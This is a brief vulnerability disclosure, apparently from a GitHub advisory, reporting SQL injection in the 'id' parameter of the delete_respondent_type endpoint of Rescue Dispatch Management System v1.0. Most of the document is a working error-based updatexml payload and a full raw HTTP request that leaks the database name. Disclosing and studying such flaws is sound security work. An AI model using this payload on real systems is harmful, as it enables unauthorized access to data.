# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File: /rdms/classes/Master.php?f=delete_respondent_type

Vulnerability location: /rdms/classes/Master.php?f=delete_respondent_type, id

[+] Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /rdms/classes/Master.php?f=delete_respondent_type HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/rdms/admin/?page=respondent_types
Content-Length: 65
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/170450106-523d5988-1593-4edd-8fea-759c5eb9fc10.png)
